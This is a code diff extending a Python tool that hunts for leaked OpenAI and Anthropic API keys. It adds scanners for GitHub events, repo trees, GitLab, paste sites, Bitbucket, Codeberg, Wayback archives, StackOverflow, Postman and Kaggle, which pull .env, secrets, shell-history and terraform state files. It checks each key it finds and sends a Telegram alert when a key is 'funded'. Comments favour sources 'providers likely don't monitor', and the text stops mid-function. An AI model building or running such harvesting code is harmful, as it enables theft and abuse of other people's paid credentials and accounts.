@@ -143,10 +143,35 @@ TOKEN_COOLDOWN_SECONDS: int = _env_int("TOKEN_COOLDOWN_SECONDS", 65, min_value=1
 
 EMPTY_TXT: str = os.getenv("EMPTY_TXT", "empty_keys.txt")
 
+# Telegram notifications (optional)
+TELEGRAM_BOT_TOKEN: str = (os.getenv("TELEGRAM_BOT_TOKEN") or "").strip()
+TELEGRAM_CHAT_ID: str = (os.getenv("TELEGRAM_CHAT_ID") or "").strip()
+
 # Per-type funded key files (only OpenAI + Anthropic)
 FUNDED_FILES: dict[str, str] = {
     "OpenAI": "openai_keys.txt",
     "Anthropic": "anthropic_keys.txt",
+}
+
+# Placeholder patterns — keys matching these are fake/example
+_PLACEHOLDER_RE = re.compile(
+    r"^sk-(?:proj-|ant-api\d{2}-)?"
+    r"(?:"
+    r"[xX]{10,}|"                         # sk-proj-xxxxxxxxxx
+    r"[yY]{10,}|"                         # sk-proj-yyyyyyyyyy
+    r"[a-zA-Z]{3,6}[0-9]{3,6}[a-zA-Z]{3,6}[0-9]{3,6}$|"  # obviously fake pattern
+    r"your[-_]?(?:api[-_]?)?key[-_]?here|"  # sk-proj-your-key-here
+    r"(?:test|fake|dummy|example|sample|placeholder|replace|insert|todo|fixme|changeme)"
+    r")",
+    re.IGNORECASE,
+)
+
+# Common placeholder full keys to skip instantly
+_KNOWN_PLACEHOLDERS: set[str] = {
+    "sk-proj-1234567890",
+    "sk-proj-xxxxxxxxxxxxxxxxxxxx",
+    "sk-ant-api03-xxxxxxxxxxxxxxxxxxxx",
+    "sk-1234567890abcdef1234567890abcdef12345678",
 }
 
 
@@ -1200,6 +1225,10 @@ class KeyVerifier:
 class BaseScanner(ABC):
     """Abstract base providing key extraction, verification, and result persistence."""
 
+    # Shared URL cache across all scanners (class-level)
+    _url_cache: set[str] = set()
+    _url_cache_max: int = 100_000
+
     def __init__(
         self,
         patterns: dict[str, str],
@@ -1217,8 +1246,27 @@ class BaseScanner(ABC):
         self.stats = stats
         self.processed: set[str] = set()
 
+    def _cache_url(self, url: str) -> bool:
+        """Return True if URL was already cached (skip it). Otherwise cache and return False."""
+        if url in BaseScanner._url_cache:
+            return True
+        BaseScanner._url_cache.add(url)
+        if len(BaseScanner._url_cache) > self._url_cache_max:
+            # Trim to half
+            keep = list(BaseScanner._url_cache)[-50_000:]
+            BaseScanner._url_cache = set(keep)
+        return False
+
     @abstractmethod
     async def run(self) -> None: ...
+
+    async def cached_fetch_and_process(self, url: str, timeout: float = 10.0) -> None:
+        """Fetch a URL (with dedup cache) and process its text for keys."""
+        if self._cache_url(url):
+            return
+        text = await self.http.fetch_text(url, timeout=timeout)
+        if text:
+            await self.process_text(text, url)
 
     async def process_text(self, text: str, source: str) -> None:
         """Extract keys from text, verify them, and persist results."""
@@ -1293,6 +1341,14 @@ class BaseScanner(ABC):
                 if key in self.existing_keys:
                     continue
 
+                # Skip obvious placeholders/examples
+                if key in _KNOWN_PLACEHOLDERS or _PLACEHOLDER_RE.search(key):
+                    continue
+                # Skip keys that are just repeated characters
+                unique_chars = set(key.replace("sk-proj-", "").replace("sk-ant-api03-", "")[:40])
+                if len(unique_chars) <= 3:
+                    continue
+
                 status, detail = await self.verifier.verify(k_type, key)
 
                 color = Fore.RED
@@ -1332,6 +1388,32 @@ class BaseScanner(ABC):
                             except OSError as exc:
                                 logger.error("Failed to write result to disk: %s", exc)
 
+                    # Telegram notification for FUNDED keys
+                    if "FUNDED" in status and TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+                        await self._telegram_notify(k_type, key, status, detail, source)
+
+    async def _telegram_notify(self, k_type: str, key: str, status: str, detail: str, source: str) -> None:
+        """Send instant Telegram notification when a funded key is found."""
+        try:
+            msg = (
+                f"🔑 *FUNDED KEY FOUND*\n\n"
+                f"*Type:* {k_type}\n"
+                f"*Key:* `{key[:20]}...{key[-10:]}`\n"
+                f"*Status:* {status} ({detail})\n"
+                f"*Source:* {source[:100]}"
+            )
+            await self.http.post(
+                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+                json_body={
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": msg,
+                    "parse_mode": "Markdown",
+                },
+                timeout=10.0,
+            )
+        except Exception as exc:
+            logger.warning("[Telegram] Notification failed: %s", exc)
+
 
 # ============================================================================
 # SECTION 9: SCANNER IMPLEMENTATIONS
@@ -1350,7 +1432,25 @@ class GitHubScanner(BaseScanner):
         if self._pool.empty:
             return
         print(f"{Fore.CYAN}[GitHub] Starting Code Search...{Style.RESET_ALL}")
-        for dork in self.dorks:
+
+        # Generate date-qualified dorks for fresh results (last 7 days)
+        from datetime import datetime, timedelta
+        week_ago = (datetime.utcnow() - timedelta(days=7)).strftime("%Y-%m-%d")
+        fresh_dorks = [
+            f'"sk-proj-" pushed:>{week_ago}',
+            f'"sk-ant-api03-" pushed:>{week_ago}',
+            f'"sk-ant-api04-" pushed:>{week_ago}',
+            f'"OPENAI_API_KEY" pushed:>{week_ago}',
+            f'"ANTHROPIC_API_KEY" pushed:>{week_ago}',
+            f'"sk-svcacct-" pushed:>{week_ago}',
+            f'"sk-ant-" pushed:>{week_ago}',
+            f'filename:.env "sk-" pushed:>{week_ago}',
+        ]
+
+        # Merge base dorks + fresh dorks, shuffle all
+        all_dorks = list(self.dorks) + fresh_dorks
+        random.shuffle(all_dorks)
+        for dork in all_dorks:
             await self._search_code(dork)
             await asyncio.sleep(0.5)
 
@@ -1362,7 +1462,10 @@ class GitHubScanner(BaseScanner):
                 if not token:
                     return
 
-                headers = {"Authorization": f"token {token}"}
+                headers = {
+                    "Authorization": f"token {token}",
+                    "Accept": "application/vnd.github.v3.text-match+json",
+                }
                 params = {
                     "q": dork,
                     "sort": "indexed",
@@ -1386,6 +1489,12 @@ class GitHubScanner(BaseScanner):
                     data = result.json_data or {}
                     tasks = []
                     for item in data.get("items", []):
+                        # Extract keys from text_matches (free, no extra API call)
+                        for tm in item.get("text_matches", []):
+                            frag = tm.get("fragment", "")
+                            if frag:
+                                tasks.append(self.process_text(frag, item.get("html_url", "")))
+                        # Also fetch full file for complete content
                         raw = (
                             item.get("html_url", "")
                             .replace("github.com", "raw.githubusercontent.com")
@@ -1414,9 +1523,7 @@ class GitHubScanner(BaseScanner):
             await asyncio.sleep(0.5)
 
     async def _fetch_raw(self, url: str) -> None:
-        text = await self.http.fetch_text(url, timeout=10.0)
-        if text:
-            await self.process_text(text, url)
+        await self.cached_fetch_and_process(url, timeout=10.0)
 
 
 class GistScanner(BaseScanner):
@@ -1489,7 +1596,9 @@ class GitLabScanner(BaseScanner):
         if self._pool.empty:
             return
         print(f"{Fore.CYAN}[GitLab] Starting search...{Style.RESET_ALL}")
-        for dork in self.dorks:
+        shuffled = list(self.dorks)
+        random.shuffle(shuffled)
+        for dork in shuffled:
             await self._search_api(dork)
             await asyncio.sleep(0.5)
 
@@ -1523,11 +1632,17 @@ class GitLabScanner(BaseScanner):
         data = result.json_data or []
         tasks = []
         for item in data:
+            # Extract keys directly from search result data (free, no extra API call)
+            snippet = item.get("data", "")
+            if snippet:
+                tasks.append(self.process_text(snippet, f"gitlab:search:{dork}"))
+            # Also fetch full file
             pid, path = item.get("project_id"), item.get("path")
             if pid and path:
                 enc_path = urllib.parse.quote(path, safe="")
-                raw = f"https://gitlab.com/api/v4/projects/{pid}/repository/files/{enc_path}/raw?ref=master"
-                tasks.append(self._fetch_gl(raw))
+                for ref in ("master", "main"):
+                    raw = f"https://gitlab.com/api/v4/projects/{pid}/repository/files/{enc_path}/raw?ref={ref}"
+                    tasks.append(self._fetch_gl(raw))
 
         if tasks:
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -1798,11 +1913,16 @@ class GitHubEventsScanner(BaseScanner):
                     # New repo/branch created — might contain leaked keys
                     repo = event.get("repo", {}).get("name", "")
                     if repo:
-                        # Check common files that leak keys
-                        for fname in [".env", "config.json", "settings.py",
-                                      "config.yaml", ".env.local"]:
-                            raw = f"https://raw.githubusercontent.com/{repo}/main/{fname}"
-                            tasks.append(self._fetch_raw_url(raw))
+                        for branch in ("main", "master"):
+                            for fname in [".env", ".env.local", ".env.production",
+                                          ".env.dev", ".env.staging",
+                                          "config.json", "config.yaml", "config.toml",
+                                          "settings.py", "secrets.py", "secrets.yaml",
+                                          ".bashrc", ".zshrc",
+                                          "docker-compose.yml", "docker-compose.yaml",
+                                          "appsettings.json", "application.yml"]:
+                                raw = f"https://raw.githubusercontent.com/{repo}/{branch}/{fname}"
+                                tasks.append(self._fetch_raw_url(raw))
 
                 elif etype == "GistEvent":
                     payload = event.get("payload", {})
@@ -1813,14 +1933,35 @@ class GitHubEventsScanner(BaseScanner):
                             tasks.append(self._fetch_raw_url(raw))
 
                 elif etype == "PublicEvent":
-                    # Repo just became public — high chance of leaked secrets
+                    # Repo just became public — HIGH chance of leaked secrets
                     repo = event.get("repo", {}).get("name", "")
                     if repo:
-                        for fname in [".env", ".env.local", ".env.production",
-                                      "config.json", "config.yaml", "secrets.py",
-                                      "docker-compose.yml"]:
-                            raw = f"https://raw.githubusercontent.com/{repo}/main/{fname}"
-                            tasks.append(self._fetch_raw_url(raw))
+                        for branch in ("main", "master"):
+                            for fname in [".env", ".env.local", ".env.production",
+                                          ".env.dev", ".env.staging", ".env.backup",
+                                          "config.json", "config.yaml", "config.toml",
+                                          "secrets.py", "secrets.yaml", "secrets.toml",
+                                          "settings.py", "constants.py",
+                                          "docker-compose.yml", "docker-compose.yaml",
+                                          "appsettings.json", "application.yml",
+                                          ".bashrc", ".zshrc", ".bash_profile",
+                                          "terraform.tfvars", "terraform.tfstate"]:
+                                raw = f"https://raw.githubusercontent.com/{repo}/{branch}/{fname}"
+                                tasks.append(self._fetch_raw_url(raw))
+                        # Also fetch repo tree to find ALL .env files
+                        tasks.append(self._scan_repo_tree(repo))
+
+                elif etype == "ForkEvent":
+                    # Forked repo may contain secrets from the original
+                    payload = event.get("payload", {})
+                    forkee = payload.get("forkee", {})
+                    full_name = forkee.get("full_name", "")
+                    if full_name:
+                        for branch in ("main", "master"):
+                            for fname in [".env", ".env.local", "config.json",
+                                          "secrets.py", "docker-compose.yml"]:
+                                raw = f"https://raw.githubusercontent.com/{full_name}/{branch}/{fname}"
+                                tasks.append(self._fetch_raw_url(raw))
 
             if tasks:
                 results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -1839,11 +1980,32 @@ class GitHubEventsScanner(BaseScanner):
             to_keep = list(self._seen_events)[-25_000:]
             self._seen_events = set(to_keep)
 
+    async def _scan_repo_tree(self, repo: str) -> None:
+        """Fetch the repo tree and check all interesting files."""
+        for branch in ("main", "master"):
+            result = await self.http.get(
+                f"https://api.github.com/repos/{repo}/git/trees/{branch}?recursive=1",
+                headers={"Authorization": f"token {await self._pool.wait_for_available() or ''}"},
+                timeout=10.0,
+            )
+            if result is None or result.status != 200:
+                continue
+            tree = (result.json_data or {}).get("tree", [])
+            _interesting = (".env", "secret", "credential", "config.json", "config.yaml",
+                            "apikey", "api_key", ".bash_history", ".zsh_history")
+            tasks: list[Any] = []
+            for node in tree:
+                path = node.get("path", "").lower()
+                if node.get("type") == "blob" and any(i in path for i in _interesting):
+                    raw = f"https://raw.githubusercontent.com/{repo}/{branch}/{node.get('path', '')}"
+                    tasks.append(self._fetch_raw_url(raw))
+            if tasks:
+                await asyncio.gather(*tasks[:50], return_exceptions=True)  # Cap at 50 files
+            break  # Found the right branch
+
     async def _fetch_raw_url(self, url: str) -> None:
         """Fetch a raw URL (no GitHub API token needed for raw.githubusercontent.com)."""
-        text = await self.http.fetch_text(url, timeout=8.0)
-        if text:
-            await self.process_text(text, url)
+        await self.cached_fetch_and_process(url, timeout=8.0)
 
     async def _fetch_commit_patch(self, url: str) -> None:
         while True:
@@ -2199,6 +2361,13 @@ class GrepAppScanner(BaseScanner):
         "api_key sk-ant-api03",
         "anthropic_key sk-ant",
         "claude_api_key sk-ant",
+        # --- Extra patterns ---
+        "openai.api_key sk-proj",
+        "OPENAI_KEY=sk-",
+        "client = OpenAI(api_key=",
+        'Anthropic(api_key="sk-ant',
+        "export OPENAI_API_KEY=sk-",
+        "export ANTHROPIC_API_KEY=sk-ant",
     ]
 
     async def run(self) -> None:
@@ -2210,8 +2379,8 @@ class GrepAppScanner(BaseScanner):
     async def _search(self, query: str) -> None:
         print(f"{Fore.BLUE}[grep.app] Search: {query}{Style.RESET_ALL}")
 
-        # grep.app returns up to 10 results per page; fetch pages 1-5
-        for page in range(1, 6):
+        # grep.app returns up to 10 results per page; fetch pages 1-10
+        for page in range(1, 11):
             params = {"q": query, "limit": "10", "offset": str((page - 1) * 10)}
             result = await self.http.get(
                 "https://grep.app/api/search",
@@ -2356,6 +2525,791 @@ class ReplitSearchScanner(BaseScanner):
             await self.process_text(text, url)
 
 
+class SearchCodeScanner(BaseScanner):
+    """Searches searchcode.com — free code search engine indexing 75B+ lines
+    from GitHub, Bitbucket, GitLab, Google Code, etc. No auth needed."""
+
+    _QUERIES: list[str] = [
+        "sk-proj-",
+        "sk-ant-api03-",
+        "sk-ant-api04-",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+        "sk-svcacct-",
+        "OPENAI_API_KEY=sk-",
+        "ANTHROPIC_API_KEY=sk-ant",
+        'openai.api_key = "sk-',
+        "sk-ant-api05-",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[SearchCode] Starting searchcode.com search ({len(self._QUERIES)} queries)...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(3.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[SearchCode] Search: {query}{Style.RESET_ALL}")
+        for page in range(0, 3):
+            params = {"q": query, "p": str(page), "per_page": "20"}
+            result = await self.http.get(
+                "https://searchcode.com/api/codesearch_I/",
+                params=params,
+                timeout=15.0,
+            )
+            if result is None or result.status != 200:
+                break
+
+            data = result.json_data or {}
+            results_list = data.get("results", [])
+            if not results_list:
+                break
+
+            tasks: list[Any] = []
+            for item in results_list:
+                # searchcode returns code lines directly
+                lines = item.get("lines", {})
+                if lines:
+                    snippet = "\n".join(str(v) for v in lines.values())
+                    url = item.get("url", "searchcode.com")
+                    tasks.append(self.process_text(snippet, url))
+
+                # Also try to fetch full file if repo URL available
+                repo = item.get("repo", "")
+                filename = item.get("filename", "")
+                if "github.com" in repo and filename:
+                    # Convert to raw URL
+                    repo_path = repo.replace("https://github.com/", "").replace("http://github.com/", "").rstrip("/").replace(".git", "")
+                    if repo_path:
+                        raw_url = f"https://raw.githubusercontent.com/{repo_path}/HEAD/{filename}"
+                        tasks.append(self._fetch(raw_url))
+
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            await asyncio.sleep(2.0)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=10.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class PostmanScanner(BaseScanner):
+    """Searches Postman public API documentation for leaked API keys.
+    People frequently share Postman collections with hardcoded keys."""
+
+    _QUERIES: list[str] = [
+        "openai api key",
+        "anthropic api key",
+        "sk-proj-",
+        "sk-ant-api",
+        "chatgpt api",
+        "claude api",
+        "openai secret",
+        "gpt-4 api key",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[Postman] Searching public Postman workspaces...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[Postman] Search: {query}{Style.RESET_ALL}")
+        # Postman public API network search
+        params = {"query": query, "size": "20", "type": "request"}
+        result = await self.http.get(
+            "https://www.postman.com/_api/ws/proxy",
+            params=params,
+            headers={"Content-Type": "application/json"},
+            timeout=15.0,
+        )
+        if result is None or result.status != 200:
+            # Fallback: try the documentation search
+            await self._search_docs(query)
+            return
+
+        data = result.json_data or {}
+        items = data.get("data", [])
+        tasks: list[Any] = []
+        for item in items:
+            # Extract from request body, headers, URL
+            for field in ("url", "body", "headerData", "rawModeData"):
+                val = item.get(field, "")
+                if isinstance(val, str) and val:
+                    tasks.append(self.process_text(val, f"postman:{item.get('id', '')}"))
+                elif isinstance(val, list):
+                    text = json.dumps(val)
+                    tasks.append(self.process_text(text, f"postman:{item.get('id', '')}"))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _search_docs(self, query: str) -> None:
+        """Fallback: search Postman public docs via DuckDuckGo."""
+        ddg_query = f'site:documenter.getpostman.com "{query}"'
+        try:
+            results = await asyncio.get_event_loop().run_in_executor(
+                None, _ddgs_search_in_subprocess, ddg_query, 10, 20.0,
+            )
+        except Exception:
+            return
+
+        tasks: list[Any] = []
+        for r in results:
+            url = r.get("href", r.get("link", ""))
+            if url:
+                tasks.append(self._fetch(url))
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=10.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class MultiplePasteScanner(BaseScanner):
+    """Scans multiple paste sites beyond Pastebin — paste.ee, dpaste.org,
+    rentry.co, etc. These are less monitored by providers."""
+
+    _PASTE_SEARCHES: list[tuple[str, str]] = [
+        # (DuckDuckGo query, site name)
+        ('site:paste.ee "sk-proj-"', "paste.ee"),
+        ('site:paste.ee "sk-ant-"', "paste.ee"),
+        ('site:dpaste.org "sk-proj-"', "dpaste.org"),
+        ('site:dpaste.org "sk-ant-"', "dpaste.org"),
+        ('site:rentry.co "sk-proj-"', "rentry.co"),
+        ('site:rentry.co "sk-ant-"', "rentry.co"),
+        ('site:paste.centos.org "OPENAI_API_KEY"', "paste.centos.org"),
+        ('site:bpa.st "sk-proj-"', "bpa.st"),
+        ('site:bpa.st "sk-ant-"', "bpa.st"),
+        ('site:paste.mozilla.org "OPENAI_API_KEY"', "paste.mozilla.org"),
+        ('site:cl1p.net "sk-proj-"', "cl1p.net"),
+        ('site:note.ms "sk-proj-"', "note.ms"),
+        ('site:note.ms "sk-ant-"', "note.ms"),
+        ('site:termbin.com "sk-proj-"', "termbin.com"),
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[MultiPaste] Searching alternative paste sites...{Style.RESET_ALL}")
+        for ddg_query, site in self._PASTE_SEARCHES:
+            await self._search(ddg_query, site)
+            await asyncio.sleep(1.5)
+
+    async def _search(self, query: str, site: str) -> None:
+        print(f"{Fore.BLUE}[MultiPaste] {site}: {query[:50]}{Style.RESET_ALL}")
+        try:
+            results = await asyncio.get_event_loop().run_in_executor(
+                None, _ddgs_search_in_subprocess, query, 15, 20.0,
+            )
+        except Exception:
+            return
+
+        tasks: list[Any] = []
+        for r in results:
+            url = r.get("href", r.get("link", ""))
+            if url:
+                tasks.append(self._fetch(url))
+            # Also check body/snippet
+            body = r.get("body", "")
+            if body:
+                tasks.append(self.process_text(body, f"ddg:{site}"))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=10.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class BitbucketScanner(BaseScanner):
+    """Searches Bitbucket public repositories (no auth needed for public search)."""
+
+    _QUERIES: list[str] = [
+        "sk-proj-",
+        "sk-ant-api03",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[Bitbucket] Searching public repos...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[Bitbucket] Search: {query}{Style.RESET_ALL}")
+        params = {"search_query": query}
+        result = await self.http.get(
+            "https://api.bitbucket.org/2.0/search/code",
+            params=params,
+            timeout=15.0,
+        )
+        if result is None or result.status != 200:
+            return
+
+        data = result.json_data or {}
+        tasks: list[Any] = []
+        for item in data.get("values", []):
+            # Extract from content matches
+            for cm in item.get("content_matches", []):
+                for line in cm.get("lines", []):
+                    text = line.get("text", "")
+                    if text:
+                        tasks.append(self.process_text(text, f"bitbucket:{item.get('file', {}).get('path', '')}"))
+
+            # Fetch full file
+            file_info = item.get("file", {})
+            links = file_info.get("links", {}).get("self", {})
+            file_url = links.get("href", "")
+            if file_url:
+                tasks.append(self._fetch(file_url))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=10.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class CodebergScanner(BaseScanner):
+    """Searches Codeberg.org (Gitea-based) — a growing alternative to GitHub.
+    API is free, no auth needed. Providers likely don't monitor Codeberg."""
+
+    _QUERIES: list[str] = [
+        "sk-proj-",
+        "sk-ant-api03-",
+        "sk-ant-api04-",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+        "sk-svcacct-",
+        "sk-ant-",
+        "openai_api_key",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[Codeberg] Searching Codeberg repos...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[Codeberg] Search: {query}{Style.RESET_ALL}")
+        # Gitea API code search
+        for page in range(1, 4):
+            params = {"q": query, "page": str(page), "limit": "50"}
+            result = await self.http.get(
+                "https://codeberg.org/api/v1/repos/search",
+                params=params,
+                timeout=15.0,
+            )
+            if result is None or result.status != 200:
+                break
+
+            data = result.json_data or {}
+            repos = data.get("data", data) if isinstance(data, dict) else data
+            if not repos or not isinstance(repos, list):
+                break
+
+            tasks: list[Any] = []
+            for repo in repos:
+                full_name = repo.get("full_name", "")
+                default_branch = repo.get("default_branch", "main")
+                if full_name:
+                    for fname in [".env", ".env.local", "config.json", "config.yaml",
+                                  "secrets.py", "docker-compose.yml", ".env.production"]:
+                        raw = f"https://codeberg.org/{full_name}/raw/branch/{default_branch}/{fname}"
+                        tasks.append(self._fetch(raw))
+
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            await asyncio.sleep(1.0)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=8.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class WaybackScanner(BaseScanner):
+    """Searches the Wayback Machine CDX API for archived .env and config files
+    that may have contained API keys before being removed. The original content
+    is still cached in the Wayback Machine."""
+
+    _CDX_QUERIES: list[tuple[str, str]] = [
+        ("*.env", "pastebin.com"),
+        ("*.env", "paste.ee"),
+        ("*.env", "dpaste.org"),
+        ("*.env", "replit.com"),
+        ("*OPENAI_API_KEY*", "github.com"),
+        ("*sk-proj-*", "github.com"),
+        ("*sk-ant-api*", "github.com"),
+        ("*ANTHROPIC_API_KEY*", "github.com"),
+        ("*.env", "vercel.app"),
+        ("*.env", "netlify.app"),
+        ("*.env", "herokuapp.com"),
+        ("*.env", "railway.app"),
+        ("*.env.local", "github.com"),
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[Wayback] Searching Wayback Machine archives...{Style.RESET_ALL}")
+        for url_pattern, domain in self._CDX_QUERIES:
+            await self._search_cdx(url_pattern, domain)
+            await asyncio.sleep(2.0)
+
+    async def _search_cdx(self, url_pattern: str, domain: str) -> None:
+        print(f"{Fore.BLUE}[Wayback] CDX: {domain}/{url_pattern}{Style.RESET_ALL}")
+        params = {
+            "url": f"{domain}/{url_pattern}",
+            "output": "json",
+            "limit": "30",
+            "fl": "timestamp,original",
+            "filter": "statuscode:200",
+            "collapse": "urlkey",
+        }
+        result = await self.http.get(
+            "https://web.archive.org/cdx/search/cdx",
+            params=params,
+            timeout=20.0,
+        )
+        if result is None or result.status != 200:
+            return
+
+        try:
+            rows = json.loads(result.body)
+        except (json.JSONDecodeError, ValueError):
+            return
+
+        if not rows or len(rows) < 2:
+            return
+
+        # First row is header, rest are data
+        tasks: list[Any] = []
+        for row in rows[1:]:
+            if len(row) >= 2:
+                timestamp, original_url = row[0], row[1]
+                wayback_url = f"https://web.archive.org/web/{timestamp}id_/{original_url}"
+                tasks.append(self._fetch(wayback_url))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=12.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class GitHubRepoScanner(BaseScanner):
+    """Searches for recently created GitHub repos with AI-related topics
+    and checks their config files for leaked keys. Uses the repos search API
+    which has separate rate limits from code search."""
+
+    def __init__(self, pool: TokenPool, *args: Any) -> None:
+        super().__init__(*args)
+        self._pool = pool
+        self._queries = [
+            "openai api created:>NOW_MINUS_1D",
+            "chatgpt key created:>NOW_MINUS_1D",
+            "anthropic api created:>NOW_MINUS_1D",
+            "claude api created:>NOW_MINUS_1D",
+            "gpt bot created:>NOW_MINUS_1D",
+            "langchain created:>NOW_MINUS_1D",
+            "llm api created:>NOW_MINUS_1D",
+            "ai chatbot created:>NOW_MINUS_1D",
+        ]
+
+    async def run(self) -> None:
+        if self._pool.empty:
+            return
+        print(f"{Fore.CYAN}[RepoScan] Searching newly created AI repos...{Style.RESET_ALL}")
+        # Replace NOW_MINUS_1D with actual date
+        from datetime import datetime, timedelta
+        yesterday = (datetime.utcnow() - timedelta(days=1)).strftime("%Y-%m-%d")
+        queries = [q.replace("NOW_MINUS_1D", yesterday) for q in self._queries]
+        for query in queries:
+            await self._search(query)
+            await asyncio.sleep(2)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.MAGENTA}[RepoScan] {query[:60]}{Style.RESET_ALL}")
+        while True:
+            token = await self._pool.wait_for_available()
+            if not token:
+                return
+            headers = {"Authorization": f"token {token}"}
+            params = {"q": query, "sort": "updated", "order": "desc", "per_page": "30"}
+            result = await self.http.get(
+                "https://api.github.com/search/repositories",
+                headers=headers,
+                params=params,
+            )
+            if result is None:
+                break
+            self._pool.update_limits(token, result.headers)
+
+            if result.status == 200:
+                data = result.json_data or {}
+                tasks: list[Any] = []
+                for repo in data.get("items", []):
+                    full_name = repo.get("full_name", "")
+                    default_branch = repo.get("default_branch", "main")
+                    if full_name:
+                        for fname in [".env", ".env.local", ".env.production",
+                                      "config.json", "config.yaml", "secrets.py",
+                                      "docker-compose.yml", "settings.py"]:
+                            raw = f"https://raw.githubusercontent.com/{full_name}/{default_branch}/{fname}"
+                            tasks.append(self._fetch(raw))
+                if tasks:
+                    await asyncio.gather(*tasks, return_exceptions=True)
+                break
+
+            if result.status in (403, 429):
+                self._pool.mark_limited(token)
+                continue
+            break
+
+    async def _fetch(self, url: str) -> None:
+        text = await self.http.fetch_text(url, timeout=8.0)
+        if text:
+            await self.process_text(text, url)
+
+
+class StackOverflowScanner(BaseScanner):
+    """Searches StackOverflow / StackExchange for leaked API keys.
+    People frequently paste real keys in questions. Free API, 300 req/day."""
+
+    _QUERIES: list[str] = [
+        "sk-proj-",
+        "sk-ant-api03",
+        "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY",
+        "openai api key not working",
+        "anthropic api key error",
+        "sk-ant-api04",
+        "openai billing error sk-",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[StackOverflow] Searching Q&A for leaked keys...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[StackOverflow] Search: {query}{Style.RESET_ALL}")
+        params = {
+            "order": "desc",
+            "sort": "creation",
+            "intitle": query,
+            "site": "stackoverflow",
+            "pagesize": "20",
+            "filter": "withbody",
+        }
+        result = await self.http.get(
+            "https://api.stackexchange.com/2.3/search/advanced",
+            params=params,
+            timeout=15.0,
+        )
+        if result is None or result.status != 200:
+            return
+
+        data = result.json_data or {}
+        tasks: list[Any] = []
+        for item in data.get("items", []):
+            body = item.get("body", "")
+            if body:
+                tasks.append(self.process_text(body, item.get("link", "stackoverflow")))
+            # Also check answers
+            qid = item.get("question_id")
+            if qid:
+                tasks.append(self._fetch_answers(qid))
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _fetch_answers(self, qid: int) -> None:
+        params = {
+            "order": "desc",
+            "sort": "creation",
+            "site": "stackoverflow",
+            "filter": "withbody",
+        }
+        result = await self.http.get(
+            f"https://api.stackexchange.com/2.3/questions/{qid}/answers",
+            params=params,
+            timeout=10.0,
+        )
+        if result is None or result.status != 200:
+            return
+        data = result.json_data or {}
+        for item in data.get("items", []):
+            body = item.get("body", "")
+            if body:
+                await self.process_text(body, f"stackoverflow.com/a/{item.get('answer_id', '')}")
+
+
+class KaggleScanner(BaseScanner):
+    """Searches Kaggle notebooks and datasets for leaked API keys.
+    Kaggle API is free. Beginners often hardcode keys in notebooks."""
+
+    _QUERIES: list[str] = [
+        "openai api key",
+        "anthropic api key",
+        "sk-proj-",
+        "sk-ant-api",
+        "chatgpt api",
+        "claude api key",
+        "OPENAI_API_KEY",
+        "langchain openai",
+    ]
+
+    async def run(self) -> None:
+        print(f"{Fore.CYAN}[Kaggle] Searching Kaggle notebooks...{Style.RESET_ALL}")
+        for query in self._QUERIES:
+            await self._search(query)
+            await asyncio.sleep(2.0)
+
+    async def _search(self, query: str) -> None:
+        print(f"{Fore.BLUE}[Kaggle] Search: {query}{Style.RESET_ALL}")
+        # Kaggle meta search via DuckDuckGo
+        ddg_query = f'site:kaggle.com/code "{query}"'
+        try:
+            results = await asyncio.get_event_loop().run_in_executor(
